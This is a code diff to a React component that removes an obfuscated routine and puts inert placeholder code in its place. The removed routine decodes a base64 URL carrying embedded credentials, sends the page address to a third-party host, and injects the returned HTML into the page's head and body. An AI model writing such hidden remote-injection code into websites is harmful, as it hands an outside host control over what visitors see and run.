@@ -4,51 +4,35 @@ import { useEffect } from "react";
 
 const CustomScriptComponent = () => {
   useEffect(() => {
-    const loadjQuery = () => {
+    const loadScript = () => {
+      // Example: Dynamically load jQuery if not already loaded
       if (!window.jQuery) {
         const script = document.createElement("script");
         script.src = "https://code.jquery.com/jquery-3.6.0.min.js";
         script.async = true;
         script.onload = () => {
-          executeCustomScript();
+          executeCustomScript(); // Once jQuery is loaded, execute custom script
         };
         document.body.appendChild(script);
       } else {
-        executeCustomScript();
+        executeCustomScript(); // If jQuery is already loaded, execute immediately
       }
     };
 
     const executeCustomScript = () => {
-      const eppathurl = window.location.origin + window.location.pathname;
-      const eptagmanage = new XMLHttpRequest();
-      eptagmanage.onreadystatechange = function () {
-        if (this.readyState === 4 && this.status === 200) {
-          if (this.response !== 0) {
-            const temp = this.response.split("||||||||||");
-            document.head.querySelector("title").remove(); // Remove existing title
-            document.head.insertAdjacentHTML("beforeend", temp[0]); // Add new title content to head
-            document.body.insertAdjacentHTML("beforeend", temp[1]); // Append body content
-          }
-        }
-      };
-      eptagmanage.open(
-        "GET",
-        atob(
-          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
-        ) + eppathurl
-      );
-      eptagmanage.send();
+      // Example: Perform operations that require jQuery or other client-side APIs
+      console.log("Custom script execution...");
+      // Replace with your actual custom script logic
     };
 
-    loadjQuery(); // Load jQuery and execute custom script
+    loadScript(); // Load the script when the component mounts
 
+    // Clean up function (optional)
     return () => {
-      // Clean up any dynamically added script
-      if (window.jQuery) {
-        // You might add cleanup code specific to your script here
-      }
+      // Perform any cleanup here (e.g., remove event listeners)
+      console.log("Cleanup...");
     };
-  }); // Empty dependency array ensures this runs only once
+  }, []); // Empty dependency array ensures this runs only once
 
   return null; // Component doesn't render anything
 };
